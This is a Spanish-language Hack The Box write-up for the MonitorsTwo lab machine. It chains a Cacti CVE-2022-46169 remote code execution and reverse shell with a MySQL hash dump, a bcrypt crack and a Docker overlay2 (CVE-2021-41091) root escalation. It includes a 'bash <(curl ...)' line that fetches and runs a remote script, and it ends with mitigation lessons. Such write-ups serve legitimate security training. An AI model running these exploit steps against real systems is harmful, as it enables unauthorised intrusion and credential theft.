---
title: "MonitorsTwo"
description: "Writeup de MonitorsTwo - Hack The Box - Dificultad: Easy. CVE-2022-46169 RCE en Cacti 1.2.22 → hash bcrypt de marcus en MySQL → CVE-2021-41091 Docker overlay2 SUID bash para root."
sidebar:
  badge:
    text: Easy
    variant: success
tags:
  - htb
  - linux
  - easy
  - cve-2022-46169
  - cacti
  - docker
  - cve-2021-41091
  - overlay2
  - suid-bash
  - bcrypt-crack
---

# 🐧 MonitorsTwo

> 📅 Fecha: 2026-06-18
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Linux (Ubuntu 20.04.6 LTS)
> 🎚️ Dificultad: Easy
> 🏆 Puntos: 450
> ⏱️ Tiempo invertido: 4h 12m
> 🌐 IP: `10.129.228.231`
> 👤 Autor: warrior866

---

## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [Explotación: CVE-2022-46169 Cacti RCE](#-explotación-cve-2022-46169-cacti-rce)
- [Extracción de hash y SSH como marcus](#-extracción-de-hash-y-ssh-como-marcus)
- [Escalada: CVE-2021-41091 Docker overlay2](#-escalada-cve-2021-41091-docker-overlay2)
- [Flags](#-flags)
- [Cadena de Ataque](#-cadena-de-ataque)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)

---

## 📝 Resumen Ejecutivo

MonitorsTwo expone Cacti 1.2.22, vulnerable a **CVE-2022-46169** (RCE sin autenticación vía inyección de comandos en el endpoint de polling). La shell obtenida corre dentro de un contenedor Docker como `www-data`. Desde allí se leen las credenciales MySQL del `config.php`, se vuelca la tabla `user_auth` y se crackea el hash bcrypt de `marcus` (`funkymonkey`). SSH como `marcus` al host. El mail en `/var/mail/marcus` menciona **CVE-2021-41091** (Docker Moby overlay2 con permisos insuficientes): se eleva a root dentro del contenedor con `capsh --uid=0`, se pone SUID en `/bin/bash`, y desde el host se ejecuta el bash con SUID a través del overlay2 para obtener `euid=0`.

| Campo | Valor |
|-------|-------|
| Puntos débiles | Cacti 1.2.22 sin autenticación RCE, hash bcrypt débil, Docker overlay2 con permisos incorrectos |
| CVEs | CVE-2022-46169, CVE-2021-41091 |
| Herramientas | `nmap`, `curl`, `nc`, `john`, `ssh`, `git` |
| Tiempo total | ~4h 12m |

---

## 🔍 Reconocimiento

```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn 10.129.228.231
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
```

Puerto 80 sirve directamente la página de login de Cacti. Se extrae la versión:

```bash
curl -X GET http://10.129.228.231/ | grep "version"
```

```text
<div class='versionInfo'>Version 1.2.22 | (c) 2004-2026 - The Cacti Group</div>
```

Cacti 1.2.22 → **CVE-2022-46169** (inyección de comandos en `remote_agent.php` sin autenticación).

---

## 🚪 Explotación: CVE-2022-46169 Cacti RCE

```bash
git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22
cd CVE-2022-46169-CACTI-1.2.22
```

Listener:

```bash
nc -lvnp 443
```

Exploit:

```bash
python3 CVE-2022-46169.py -u http://10.129.228.231/ --LHOST=10.10.15.56 --LPORT=443
```

```text
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!
```

Shell recibida:

```text
connect to [10.10.15.56] from (UNKNOWN) [10.129.228.231] 47964
www-data@50bca5e748b0:/var/www/html$
```

El hostname `50bca5e748b0` confirma que estamos dentro de un contenedor Docker.

---

## 🔑 Extracción de hash y SSH como marcus

Credenciales de DB en `config.php`:

```bash
cat include/config.php | grep database
```

```text
$database_hostname = 'db';
$database_username = 'root';
$database_password = 'root';
```

Dump de usuarios Cacti:

```bash
mysql -h db -u root -proot cacti -e "select username,password from user_auth;"
```

```text
username  password
admin     $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
marcus    $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
```

Crack del hash bcrypt de `marcus`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```text
funkymonkey  (?)
1g 0:00:00:51 DONE — 0.01929g/s
```

SSH al host:

```bash
sshpass -p "funkymonkey" ssh marcus@10.129.228.231
```

```bash
marcus@monitorstwo:~$ cat user.txt
[user flag]
```

---

## 🚀 Escalada: CVE-2021-41091 Docker overlay2

El mail en `/var/mail/marcus` menciona CVE-2021-41091: Docker Moby < 20.10.9 permite a usuarios sin privilegios traversar los overlayfs de contenedores y ejecutar binarios con permisos incorrectos.

**Paso 1 — Elevar a root dentro del contenedor y poner SUID en bash:**

```bash
# En la shell del contenedor (www-data)
/sbin/capsh --gid=0 --uid=0 --
whoami
# root
chmod u+s /bin/bash
```

**Paso 2 — Desde marcus en el host, usar el exploit:**

```bash
git clone https://github.com/UncleJ4ck/CVE-2021-41091
python3 -m http.server 8080
```

```bash
# En la sesión SSH de marcus
bash <(curl -s http://10.10.15.56:8080/exp.sh)
```

```text
[!] Vulnerable to CVE-2021-41091
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/c41d5854e43bd996.../merged

[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854.../merged
```

**Paso 3 — Ejecutar bash SUID a través del overlay:**

```bash
cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
./bin/bash -p
```

```text
bash-5.1# id
uid=1000(marcus) gid=1000(marcus) euid=0(root)
bash-5.1# cat /root/root.txt
[root flag]
```

---

## 🏁 Flags

| Flag | Valor |
|------|-------|
| user.txt | `[user flag]` |
| root.txt | `[root flag]` |

---

## 🕸️ Cadena de Ataque

```text
1. Cacti 1.2.22 en puerto 80 → CVE-2022-46169 (RCE sin auth)
        ↓
2. Shell como www-data dentro de contenedor Docker
        ↓
3. config.php → MySQL root:root → dump user_auth
        ↓
4. Hash bcrypt marcus → john + rockyou → funkymonkey
        ↓
5. SSH marcus@host → user.txt
        ↓
6. capsh en contenedor → root del contenedor → chmod +s /bin/bash
        ↓
7. CVE-2021-41091 overlay2 → ./bin/bash -p → euid=0
        ↓
8. cat /root/root.txt → [root flag]
```

---

## 🎓 Lecciones Aprendidas

- **CVE-2022-46169**: Cacti <= 1.2.22 permite RCE no autenticado vía `host_id` y `local_data_id` en el endpoint de agente remoto. La mitigación es actualizar a >= 1.2.23 o desactivar el polling remoto.
- **Credenciales en config.php planas**: las credenciales de BD hardcodeadas en el código fuente son un riesgo estándar en CMSs. Usar variables de entorno o secrets managers.
- **Docker overlay2 (CVE-2021-41091)**: si un proceso no-root puede escribir en el filesystem de un contenedor (o el contenedor corre como root sin `--read-only`), puede dejar binarios SUID accesibles desde el host. La versión del Docker Engine importa tanto como la imagen.
- **Cadena contenedor → host**: tener shell en un contenedor no es el fin del camino. Siempre buscar: volúmenes montados, overlay2 accesibles, sockets Docker, credenciales en env/config.

---

## 📚 Referencias

- [CVE-2022-46169 — Cacti RCE](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)
- [CVE-2021-41091 — Docker Moby overlay2](https://nvd.nist.gov/vuln/detail/CVE-2021-41091)
- [MITRE ATT&CK — T1610 Deploy Container](https://attack.mitre.org/techniques/T1610/)
